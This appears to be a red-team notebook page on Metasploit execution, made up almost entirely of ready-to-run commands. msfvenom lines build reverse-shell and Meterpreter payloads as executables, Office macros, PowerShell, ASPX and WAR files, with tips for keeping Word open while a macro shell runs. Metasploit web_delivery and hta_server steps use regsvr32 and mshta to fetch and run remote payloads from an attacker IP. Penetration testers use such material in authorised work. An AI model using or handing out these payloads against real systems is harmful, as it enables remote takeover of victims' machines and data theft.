---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/execution/metasploit
---

# Metasploit

## Msfvenom

<figure><img src="../../../.gitbook/assets/Screenshot 2026-04-24 at 1.33.00 in the afternoon (1).png" alt=""><figcaption></figcaption></figure>

#### &#x20;Why thread matters for Office:

```bash
  # BAD - This will close Word when shell exits
  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f vbapplication
  
  # GOOD - Shell runs in separate thread, Word stays open
  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
```

#### Practical msfvenom Examples

```bash
  # 32-bit reverse TCP shell (non-staged)
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o shell.exe

  # 32-bit Meterpreter HTTPS (staged) - for 32-bit Office
  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication

  # 64-bit Meterpreter HTTPS (staged) - for 64-bit Office
  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication

  # PowerShell format
  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

#### Execute and Raw File

```bash
# Execute and Raw File
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o rev.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o rev.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o shell.bin
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin 
msfvenom -p windows/x64/messagebox text='Numpang Numpang' title='MalDev' -f raw -o MsgProc.bin
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe > backdoor_https.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe > backdoor_https.exe

# Aspx
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx > shell.aspx

# Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f war > shell.war
```

* <mark style="color:red;">**\_**</mark> stageless Payload (Non-Staged): Contained all the codes
* <mark style="color:red;">**/**</mark> staged Payload: Contained minimal of code and then callback for retrieve remaining code

## Script Web Delivery

```basic
msf5 > use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 3
msf5 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > set lhost eth0
msf5 exploit(multi/script/web_delivery) > run

C:\Users\>regsvr32 /s /n /u /i:http://10.10.10.10:8080/YqGCyxv.sct scrobj.dll
```

## HTA Server

```basic
msfconsole -q
use exploit/windows/misc/hta_server
exploit

mshta.exe http://10.10.10.10:8080/3DNaWL5PZTS.hta
```
